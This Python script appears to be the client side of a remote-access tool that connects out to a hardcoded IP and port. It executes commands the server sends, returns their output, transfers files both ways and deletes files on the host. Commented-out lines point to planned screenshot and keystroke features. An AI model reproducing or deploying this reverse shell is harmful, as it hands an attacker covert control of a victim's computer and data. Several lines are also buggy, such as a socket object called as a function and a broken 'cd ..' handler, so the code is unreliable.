from socket import *
from subprocess import getoutput as out
from colorama import Fore as c
from os import system as sys
import os
# from pyautogui import hotkey as key
# from pyautogui import typewrite as tp
# from pyautogui import screenshot as shot
# import pyautogui as pg
# pg.FAILSAFE

gr,rd,bl,cy,mg,yl = c.GREEN,c.RED,c.BLUE,c.CYAN,c.MAGENTA,c.YELLOW
lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

colors = [gr,lgr,rd,lrd,bl,lbl,cy,lcy,mg,lmg,yl,lyl]

s = socket(AF_INET,SOCK_STREAM)

def recv():
    name = s.recv(123456879).decode()
    file = s.recv(123456879).decode()
    f = open(name, 'wt')
    f.write(file)
    f.close()
def send():
    name = s.recv(123456789).decode()
    f = open(name, 'rb')
    read = f.read()
    s.send(read)
    f.close()
try:
    s.connect(('192.168.42.118',5353))
except OSError:
    print(f"{gr}SERVER {rd}INVALID ")
print("CONNECTED SERVER")

kea = ['python ','cd ','cd ..','port','del /a ','del ']

while 1:
    data = s.recv(123456789).decode()
    if data.startswith('python '):
        op = data.replace('python ','')
        op_info = out(f'python {op}')
        s.send('RUNED'.encode())
    if data.startswith('cd '):
        dire = data.replace('cd ','')
        os.chdir(dire)
    if data == 'cd ..':
        os.chdir('.')
    if data == 'port':
        s.send(out('netstat -an').encode())
    if data.startswith('del /a '):
        file = data.replace("del /a ","")
        os.remove(file)
    if data.startswith('del '):
        parm = data.replace("del ","").split('.')
        s(f'del {parm[0]}.{parm[1]}')
    if data == 'recv':
        recv()
    if data == "send":
        send()
    if data.startswith("s ",''):
        d = data.replace('s ','')
        data_o = out(d)
        s.send(data_o.encode())
s.close()
